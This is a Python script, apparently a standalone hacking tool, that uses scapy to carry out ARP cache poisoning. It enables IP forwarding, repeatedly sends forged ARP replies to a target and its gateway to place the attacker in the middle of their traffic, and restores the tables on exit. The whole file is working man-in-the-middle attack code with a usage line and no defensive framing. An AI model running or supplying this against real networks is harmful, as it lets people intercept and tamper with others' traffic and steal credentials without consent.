from scapy.all import *
from scapy.layers.l2 import ARP,Ether
import sys
from colorama import init,Fore
init()

r = Fore.RED
g = Fore.GREEN
y = Fore.YELLOW
b = Fore.BLUE
reset = Fore.RESET

target_ip= sys.argv[1]
host_ip=sys.argv[2]

usage="sudo python3 arspoofer [TARGET_IP] [HOST_IP/GATEWAY_IP]"

if not target_ip or not host_ip:
    print(usage)
def enable_ip_forward():                        #temporary port forward
    file_path='/proc/sys/net/ipv4/ip_forward'
    with open(file_path,'w+') as file:
        if file.read==1:
            pass
        else:
            file.write('1')


def get_mac(ip):
    answered , unanswered = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip),verbose=0)
    if answered:
        return answered[0][1].src

def spoof(target_ip,host_ip):
    target_mac=get_mac(target_ip)
    arp_response=ARP(pdst=target_ip,hwdst=target_mac,psrc=host_ip,op='is-at')
    send(arp_response,verbose=0)
    self_mac=ARP().hwsrc
    print(f"{b}[+] Sent to {target_ip} : {host_ip} is-at {self_mac}{reset}")

def restore(target_ip,host_ip):
    target_mac = get_mac(target_ip)
    host_mac=get_mac(host_ip)
    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac)
    send(arp_response, verbose=0,count=5)
    print(f"{y}[+] Sent to {target_ip} : {host_ip} is-at {host_mac}{reset}")


enable_ip_forward()

try:
    while True:
        spoof(target_ip, host_ip)
        spoof(host_ip,target_ip)
        time.sleep(1)

except KeyboardInterrupt:
    print(f"{r}[!]Keyboard Interruption, restoring network....{reset}")
    restore(target_ip, host_ip)
    restore(host_ip,target_ip)